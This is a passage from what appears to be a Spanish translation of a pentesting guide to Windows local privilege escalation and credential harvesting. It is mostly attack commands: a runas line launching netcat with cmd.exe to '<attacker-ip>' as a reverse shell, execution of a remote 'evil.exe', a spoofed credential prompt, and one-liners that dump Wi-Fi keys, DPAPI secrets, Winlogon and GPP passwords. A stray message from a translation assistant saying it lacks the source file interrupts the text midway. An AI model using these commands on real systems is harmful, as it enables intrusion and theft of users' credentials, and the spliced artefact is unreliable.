- Monitoree user-mode opens de nombres de dispositivo sospechosos (e.g., \\ .\\amsdk*) y secuencias específicas de IOCTL indicativas de abuso.
- Aplique la lista de controladores vulnerables de Microsoft (HVCI/WDAC/Smart App Control) y mantenga sus propias listas de permitidos/denegados.


## PATH DLL Hijacking

Si tiene **write permissions inside a folder present on PATH** podría ser capaz de secuestrar una DLL cargada por un proceso y **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para más información sobre cómo abusar de esta comprobación:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Red

### Recursos compartidos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Comprueba si hay otros equipos conocidos hardcoded en el hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de red y DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Puertos abiertos

Comprobar la existencia de **servicios restringidos** desde el exterior
```bash
netstat -ano #Opened ports?
```
### Tabla de enrutamiento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabla ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reglas del Firewall

[**Consulta esta página para comandos relacionados con Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para enumeración de red aquí](../basic-cmd-for-pentesters.md#network)

### Subsistema de Windows para Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
El binario `bash.exe` también se puede encontrar en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes el usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, te preguntará mediante la interfaz gráfica si `nc` debe ser permitido por el firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar bash como root fácilmente, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciales de Windows

### Credenciales de Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Administrador de credenciales / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
El Windows Vault almacena credenciales de usuario para servidores, sitios web y otros programas en los que **Windows** puede **iniciar sesión automáticamente**. A primera vista, esto podría parecer que los usuarios pueden almacenar sus credenciales de Facebook, Twitter, Gmail, etc., para que inicien sesión automáticamente en los navegadores. Pero no es así.

Windows Vault almacena credenciales que Windows puede usar para iniciar sesión automáticamente en nombre de los usuarios, lo que significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o un sitio web) **puede hacer uso de este Credential Manager** & Windows Vault y usar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña todo el tiempo.

A menos que las aplicaciones interactúen con Credential Manager, no creo que sea posible que usen las credenciales para un recurso dado. Así que, si tu aplicación quiere hacer uso del vault, debería de alguna manera **comunicarse con el credential manager y solicitar las credenciales para ese recurso** desde el vault de almacenamiento predeterminado.

Usa el `cmdkey` para listar las credenciales almacenadas en la máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Entonces puedes usar `runas` con las opciones `/savecred` para usar las credenciales guardadas. El siguiente ejemplo llama a un binario remoto a través de un SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` con un conjunto de credenciales proporcionadas.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Tenga en cuenta que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o el [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** proporciona un método para el cifrado simétrico de datos, utilizado predominantemente dentro del sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado aprovecha un secreto del usuario o del sistema para aportar una cantidad significativa de entropía.

**DPAPI permite el cifrado de claves mediante una clave simétrica que se deriva de los secretos de inicio de sesión del usuario**. En escenarios que implican cifrado a nivel de sistema, utiliza los secretos de autenticación de dominio del sistema.

Las claves RSA de usuario cifradas, al usar DPAPI, se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, coubicada con la clave maestra que salvaguarda las claves privadas del usuario en el mismo archivo**, normalmente consta de 64 bytes de datos aleatorios. (Es importante notar que el acceso a este directorio está restringido, impidiendo listar su contenido mediante el comando `dir` en CMD, aunque sí puede listarse a través de PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puedes usar el **mimikatz module** `dpapi::masterkey` con los argumentos apropiados (`/pvk` o `/rpc`) para descifrarlo.

Los **credentials files protected by the master password** se suelen encontrar en:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
Puedes **extraer muchos DPAPI** **masterkeys** desde **memory** con el módulo `sekurlsa::dpapi` (si eres root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credenciales

Las **PowerShell credentials** se usan a menudo para tareas de **scripting** y automatización como una forma de almacenar credenciales cifradas de forma conveniente. Las credenciales están protegidas usando **DPAPI**, lo que normalmente significa que solo pueden ser descifradas por el mismo usuario en el mismo equipo en el que fueron creadas.

Para **descifrar** unas credenciales PS desde el archivo que las contiene puedes hacer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos ejecutados recientemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Administrador de credenciales de Escritorio remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa el módulo **Mimikatz** `dpapi::rdg` con el `/masterkey` apropiado para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchas DPAPI masterkeys** de la memoria con el módulo `sekurlsa::dpapi` de Mimikatz

### Sticky Notes

La gente suele usar la aplicación StickyNotes en estaciones de trabajo Windows para **guardar contraseñas** y otra información, sin darse cuenta de que es un archivo de base de datos. Este archivo está ubicado en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` y siempre vale la pena buscarlo y examinarlo.

### AppCmd.exe

**Ten en cuenta que para recuperar contraseñas desde AppCmd.exe necesitas ser Administrador y ejecutarlo con un nivel de integridad alto.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\  
Si este archivo existe, es posible que se hayan configurado algunas **credentials** y que puedan ser **recuperadas**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Comprueba si `C:\Windows\CCM\SCClient.exe` existe .\
Los instaladores **se ejecutan con privilegios SYSTEM**, muchos son vulnerables a **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Archivos y Registro (Credenciales)

### Credenciales de Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Claves SSH del host de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys en el registro

SSH private keys pueden almacenarse dentro de la clave de registro `HKCU\Software\OpenSSH\Agent\Keys`, así que deberías comprobar si hay algo interesante allí:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si encuentras alguna entrada dentro de esa ruta, probablemente sea una SSH key guardada. Está almacenada cifrada pero puede ser fácilmente descifrada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si el servicio `ssh-agent` no está en ejecución y quieres que se inicie automáticamente al arranque, ejecuta:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas claves ssh, añadirlas con `ssh-add` e iniciar sesión vía ssh en una máquina. El registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no identificó el uso de `dpapi.dll` durante la autenticación de clave asimétrica.

### Archivos desatendidos
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Contenido de ejemplo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Copias de seguridad de SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciales en la nube
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Contraseña GPP en caché

Anteriormente existía una función que permitía desplegar cuentas de administrador local personalizadas en un grupo de equipos mediante Group Policy Preferences (GPP). Sin embargo, este método tenía fallos de seguridad importantes. En primer lugar, los Group Policy Objects (GPOs), almacenados como archivos XML en SYSVOL, podían ser accedidos por cualquier usuario del dominio. En segundo lugar, las contraseñas dentro de estos GPPs, cifradas con AES256 usando una clave por defecto documentada públicamente, podían ser descifradas por cualquier usuario autenticado. Esto suponía un riesgo serio, ya que podría permitir a usuarios obtener privilegios elevados.

Para mitigar este riesgo, se desarrolló una función que escanea archivos GPP almacenados localmente que contienen un campo "cpassword" no vacío. Al encontrar dicho archivo, la función descifra la contraseña y devuelve un objeto PowerShell personalizado. Este objeto incluye detalles sobre el GPP y la ubicación del archivo, ayudando en la identificación y remediación de esta vulnerabilidad de seguridad.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descifrar el cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obtener las contraseñas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Ejemplo de web.config con credenciales:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciales de OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registros
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pedir credenciales

Siempre puedes **pedir al usuario que introduzca sus credenciales o incluso las credenciales de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedir** al cliente directamente las **credenciales** es realmente **arriesgado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Posibles nombres de archivos que contienen credentials**

Archivos conocidos que hace algún tiempo contenían **passwords** en **clear-text** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md. Por favor, pega el contenido del archivo que quieres que traduzca, o aclara qué entiendes por "Search all of the proposed files" (por ejemplo, ¿quieres que busque dentro de varios archivos del repositorio? si es así, proporciona la lista o los archivos).
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciales en la Papelera de reciclaje

También deberías revisar la Papelera para buscar credenciales dentro de ella

Para **recuperar contraseñas** guardadas por varios programas puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro del registro

**Otras posibles claves del registro con credenciales**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Debes buscar bases de datos (dbs) donde se almacenan las contraseñas de **Chrome o Firefox**.\
También revisa el historial, los marcadores y los favoritos de los navegadores, ya que quizás algunas **contraseñas** estén almacenadas allí.

Herramientas para extraer contraseñas de navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **intercomunicación** entre componentes de software escritos en diferentes lenguajes. Cada componente COM está **identificado mediante un class ID (CLSID)** y cada componente expone funcionalidad a través de una o más interfaces, identificadas mediante interface IDs (IIDs).

Las clases e interfaces COM se definen en el registro bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface** respectivamente. Este registro se crea al fusionar **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSID de este registro puedes encontrar la clave secundaria **InProcServer32**, que contiene un **valor por defecto** que apunta a una **DLL** y un valor llamado **ThreadingModel** que puede ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) o **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Básicamente, si puedes **sobrescribir cualquiera de las DLLs** que se van a ejecutar, podrías **escalar privilegios** si esa DLL se ejecuta bajo otro usuario.

Para aprender cómo los atacantes usan COM Hijacking como mecanismo de persistencia consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Búsqueda genérica de contraseñas en archivos y el registro**

**Buscar contenido de archivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Buscar un archivo con un nombre de archivo específico**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Buscar en el registry nombres de claves y contraseñas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Herramientas que buscan passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin que he creado para **ejecutar automáticamente cada módulo POST de metasploit que busca credentials** dentro de la víctima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen passwords mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra gran herramienta para extraer passwords de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sessions**, **usernames** y **passwords** de varias herramientas que guardan estos datos en texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY, y RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagínate que **un proceso que se ejecuta como SYSTEM abre un nuevo proceso** (`OpenProcess()`) con **full access**. El mismo proceso **también crea un nuevo proceso** (`CreateProcess()`) **con low privileges pero heredando todos los open handles del proceso principal**.\
Entonces, si tienes **full access al proceso con low privileges**, puedes coger el **open handle del proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lee este ejemplo para más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee este **otro post para una explicación más completa sobre cómo probar y abusar de más open handlers de procesos y threads heredados con diferentes niveles de permisos (no solo full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Los segmentos de memoria compartida, conocidos como **pipes**, permiten la comunicación entre procesos y la transferencia de datos.

Windows ofrece una característica llamada **Named Pipes**, que permite a procesos no relacionados compartir datos, incluso a través de diferentes redes. Esto se asemeja a una arquitectura cliente/servidor, con roles definidos como **named pipe server** y **named pipe client**.

Cuando se envían datos por un pipe desde un **client**, el **server** que configuró el pipe tiene la capacidad de **asumir la identidad** del **client**, siempre que tenga los derechos **SeImpersonate** necesarios. Identificar un **proceso privilegiado** que se comunique vía un pipe que puedas imitar ofrece la oportunidad de **obtener mayores privilegios** adoptando la identidad de ese proceso cuando interactúe con el pipe que hayas establecido. Para instrucciones sobre cómo ejecutar este ataque, hay guías útiles [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).

Además, la siguiente herramienta permite **interceptar la comunicación de un named pipe con una herramienta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite listar y ver todos los pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Varios

### Extensiones de archivo que podrían ejecutar cosas en Windows

Consulta la página **[https://filesec.io/](https://filesec.io/)**

### **Monitorización de líneas de comando en busca de contraseñas**

Al obtener un shell como un usuario, puede haber tareas programadas u otros procesos ejecutándose que **pasan credenciales en la línea de comandos**. El script a continuación captura las líneas de comando de los procesos cada dos segundos y compara el estado actual con el anterior, mostrando cualquier diferencia.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si tienes acceso a la interfaz gráfica (vía consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar un terminal u otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto permite escalar privilegios y evadir UAC al mismo tiempo con la misma vulnerabilidad. Además, no es necesario instalar nada y el binario usado durante el proceso está firmado y emitido por Microsoft.

Algunos de los sistemas afectados son los siguientes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
